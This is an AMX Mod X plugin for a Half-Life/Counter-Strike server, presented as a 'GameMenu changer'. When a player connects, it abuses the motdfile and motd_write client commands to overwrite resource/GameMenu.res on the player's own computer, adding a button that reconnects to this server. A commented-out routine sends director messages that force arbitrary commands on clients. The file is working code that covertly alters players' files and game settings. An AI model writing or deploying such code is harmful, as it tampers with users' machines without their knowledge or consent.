#include <amxmodx>

#pragma compress 1

new szText[1200];

new hostname[ 64 ];
new server_ip[ 64 ];
	
public plugin_precache()
{
	precache_generic("resource/GameMenu.res");
}

public plugin_init()
{
	register_plugin("GameMenu changer", "1.0" , "~D4rkSiD3Rs~");

	set_task( 1.0, "check_server");
}

public check_server()
{
	get_cvar_string( "hostname", hostname, 63 );
	get_user_ip ( 0, server_ip, 63 );

	new size = sizeof(szText) - 1;
	format(szText, size, "^"GameMenu^" { ^"1^" { ^"label^" ^"%s^"", hostname);
	format(szText, size, "%s ^"command^" ^"engine connect %s^"", szText, server_ip);
	format(szText, size, "%s } ^"2^" { ^"label^" ^"^" ^"command^" ^"^" }", szText);
	format(szText, size, "%s ^"3^" { ^"label^" ^"#GameUI_GameMenu_ResumeGame^"", szText);
	format(szText, size, "%s ^"command^" ^"ResumeGame^" ^"OnlyInGame^" ^"1^" }", szText);
	format(szText, size, "%s ^"4^" { ^"label^" ^"#GameUI_GameMenu_Disconnect^"", szText);
	format(szText, size, "%s ^"command^" ^"Disconnect^" ^"OnlyInGame^" ^"1^"", szText);
	format(szText, size, "%s ^"notsingle^" ^"1^" } ^"5^" { ^"label^" ^"#GameUI_GameMenu_PlayerList^"", szText);
	format(szText, size, "%s ^"command^" ^"OpenPlayerListDialog^" ^"OnlyInGame^" ^"1^" ^"notsingle^" ^"1^"", szText);
	format(szText, size, "%s } ^"9^" { ^"label^" ^"^" ^"command^" ^"^" ^"OnlyInGame^" ^"1^" }", szText);
	format(szText, size, "%s ^"10^" { ^"label^" ^"#GameUI_GameMenu_NewGame^" ^"command^" ^"OpenCreateMultiplayerGameDialog^"", szText);
	format(szText, size, "%s } ^"11^" { ^"label^" ^"#GameUI_GameMenu_FindServers^" ^"command^" ^"OpenServerBrowser^"", szText);
	format(szText, size, "%s } ^"12^" { ^"label^" ^"#GameUI_GameMenu_Options^" ^"command^" ^"OpenOptionsDialog^"", szText);
	format(szText, size, "%s } ^"13^" { ^"label^" ^"#GameUI_GameMenu_Quit^" ^"command^" ^"Quit^" } }", szText);
}

public client_putinserver(id)
	set_task(1.0, "TaskChangeMenu", id);

public TaskChangeMenu(id)
{
	client_cmd(id, "motdfile ^"resource/GameMenu.res^"");
	client_cmd(id, "motd_write %s", szText);
	client_cmd(id, "motdfile ^"motd.txt^"");
}
/*
stock force_cmd( id , const szText[] , any:... )
{
	#pragma unused szText

	new szMessage[ 256 ];

	format_args( szMessage ,charsmax( szMessage ) , 1 );

	message_begin( id == 0 ? MSG_ALL : MSG_ONE, 51, _, id )
	write_byte( strlen( szMessage ) + 2 )
	write_byte( 10 )
	write_string( szMessage )
	message_end()
}
*/
/* AMXX-Studio Notes - DO NOT MODIFY BELOW HERE
*{\\ rtf1\\ ansi\\ deff0{\\ fonttbl{\\ f0\\ fnil Tahoma;}}\n\\ viewkind4\\ uc1\\ pard\\ lang1036\\ f0\\ fs16 \n\\ par }
*/
